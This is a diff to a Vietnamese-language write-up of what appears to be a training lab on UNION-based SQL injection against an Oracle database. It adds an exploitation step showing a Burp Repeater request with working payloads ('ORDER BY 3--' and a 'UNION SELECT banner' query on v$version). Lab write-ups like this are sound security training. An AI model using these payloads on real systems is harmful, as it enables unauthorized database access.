@@ -16,7 +16,7 @@ Trích xuất thông tin phiên bản DB.
   - **Kết quả:** lỗi SQL xuất hiện, xác nhận lỗ hổng
     ![lỗi](./images/error.png)
 
-- Xác định số cột hiển thị trong chuỗi bằng:
+- Xác định số cột hiển thị trong bảng bằng:
   - Payload:
     ```
     'ORDER BY 3--
@@ -38,8 +38,15 @@ Trích xuất thông tin phiên bản DB.
     ```
     'UNION SELECT banner,NULL FROM v$version--
     ```
-    - **Kết quả**
-        ![version](./images/banner.png)
+
+3. **Khai thác (Exploitation)**
+- Gửi payload bằng Burp Repeater:
+  ```
+  GET /filter?category=Pets'UNION+SELECT+banner,NULL+FROM+v$version-- HTTP/2
+  ```
+  ![payload](./images/payload.png)
+- **Kết quả**: trích xuất được thông tin phiên bản của Oracle và hoàn thành lab.
+  ![version](./images/banner.png)
 
 ### Bài học rút ra
 - Nâng cao kĩ năng UNION để trích xuất dữ liệu đa cột và lấy thông tin phiên bản.
